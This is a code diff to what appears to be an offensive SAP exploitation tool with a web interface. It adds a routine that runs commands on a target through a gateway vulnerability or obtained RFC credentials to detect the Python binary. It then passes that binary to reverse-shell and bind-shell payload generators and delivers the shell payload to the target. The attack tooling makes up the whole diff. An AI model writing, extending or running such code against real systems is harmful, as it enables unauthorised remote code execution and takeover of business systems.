@@ -450,7 +450,39 @@ def _win_multistep_payload(ps_script: str, display: str) -> dict:
     }
 
 
-def _generate_payload(os_type: str, ip: str, port: int) -> dict:
+def _detect_python_cmd(node) -> str:
+    """Detect whether the target has python3 or python (2.x).
+    Caches result on node._python_cmd.
+    """
+    cached = getattr(node, "_python_cmd", None)
+    if cached:
+        return cached
+    # Try python3 first via a quick GW or SXPG probe
+    for cmd in ("python3", "python"):
+        try:
+            if node.gw_vulnerable:
+                result = sapmap_exploit.execute_gw_command(
+                    node, cmd, "--version")
+            else:
+                creds = node.best_credentials()
+                if creds:
+                    result = sapmap_rfc.execute_local_command(
+                        node, cmd, "--version", creds)
+                else:
+                    continue
+            if result.get("success"):
+                node._python_cmd = cmd
+                print(f"[*] {node.sid}: Detected {cmd}")
+                return cmd
+        except Exception:
+            pass
+    # Default to python3
+    node._python_cmd = "python3"
+    return "python3"
+
+
+def _generate_payload(os_type: str, ip: str, port: int,
+                      python_cmd: str = "python3") -> dict:
     """Generate reverse shell payload based on OS type."""
     is_win = any(w in (os_type or "").lower() for w in ("windows", "nt", "win"))
     if is_win:
@@ -481,13 +513,14 @@ def _generate_payload(os_type: str, ip: str, port: int) -> dict:
         )
         assert " " not in py_code, f"Space in payload: {py_code}"
         return {
-            "command": "python3",
+            "command": python_cmd,
             "params": f"-c {py_code}",
-            "display": f"Python3 reverse shell → {ip}:{port}",
+            "display": f"{python_cmd} reverse shell → {ip}:{port}",
         }
 
 
-def _generate_bind_payload(os_type: str, port: int) -> dict:
+def _generate_bind_payload(os_type: str, port: int,
+                           python_cmd: str = "python3") -> dict:
     """Generate bind shell payload — opens a listening port on the target."""
     is_win = any(w in (os_type or "").lower() for w in ("windows", "nt", "win"))
     if is_win:
@@ -529,9 +562,9 @@ def _generate_bind_payload(os_type: str, port: int) -> dict:
         assert " " not in py_code, f"Space in bind payload: {py_code}"
         assert len(py_code) < 252, f"Bind payload too long: {len(py_code)} chars"
         return {
-            "command": "python3",
+            "command": python_cmd,
             "params": f"-c {py_code}",
-            "display": f"Python3 bind shell on target port {port}",
+            "display": f"{python_cmd} bind shell on target port {port}",
         }
 
 
@@ -1494,14 +1527,20 @@ def create_app(api: SAPMAPApi) -> Bottle:
 
         def _send():
             target_host = node.ip or node.hostname
+            # Detect python binary for Linux targets
+            is_win = any(w in (node.os_type or "").lower()
+                         for w in ("windows", "nt", "win"))
+            py_cmd = "python3" if is_win else _detect_python_cmd(node)
             if shell_mode == "bind":
-                payload = _generate_bind_payload(node.os_type, shell_port)
+                payload = _generate_bind_payload(
+                    node.os_type, shell_port, python_cmd=py_cmd)
                 print(f"[*] {sid}: Sending bind shell payload: "
                       f"{payload['display']}")
                 print(f"    Will connect to {target_host}:{shell_port} "
                       f"after payload delivery")
             else:
-                payload = _generate_payload(node.os_type, local_ip, shell_port)
+                payload = _generate_payload(
+                    node.os_type, local_ip, shell_port, python_cmd=py_cmd)
                 print(f"[*] {sid}: Sending reverse shell payload: "
                       f"{payload['display']}")
                 print(f"    Listening on 0.0.0.0:{shell_port}")
